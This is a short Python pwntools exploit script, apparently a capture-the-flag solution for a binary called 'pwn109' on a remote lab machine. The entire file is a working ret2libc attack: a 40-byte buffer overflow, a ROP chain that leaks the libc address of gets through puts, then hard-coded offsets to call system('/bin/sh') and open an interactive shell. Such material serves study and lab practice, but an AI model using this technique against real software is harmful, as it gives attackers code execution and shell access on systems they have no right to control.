from pwn import *


MACHINE_IP = ''    # Change this
PORT = 9009
elf = context.binary = ELF('./pwn109.pwn109')
#p = process('./pwn109.pwn109')
p = remote(MACHINE_IP, PORT)

offset = 40
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]	# 0x000000000040101a
pop_rdi = rop.find_gadget(['pop rdi; ret'])[0]	# 0x00000000004012a3

payload = flat(
	b'A'*offset,
	pop_rdi,
	elf.got.gets,
	elf.plt.puts,
	elf.symbols.main
)

p.recvuntil(b'ahead')
p.recv() # receiving emoji
p.sendline(payload)
output = p.recv()
leaked_gets_address = u64(output.ljust(8, b'\x00'))
info("leaked_gets_address: %#x", leaked_gets_address)

# Couldn't leak the address of puts, some error occurred
#libc6_2.27-3ubuntu1.4_amd64
#libc6_2.27-3ubuntu1.3_amd64

#system offset relative to gets address = -0x30c40
#str-bin-sh offset relative to gets address = 0x133c8a

system_offset = -0x30c40
binsh_offset = 0x133c8a
payload1 = flat(
	b'A'*offset,
	ret_gadget,
	pop_rdi,
	leaked_gets_address+binsh_offset,
	leaked_gets_address+system_offset
)

p.sendline(payload1)
p.interactive()
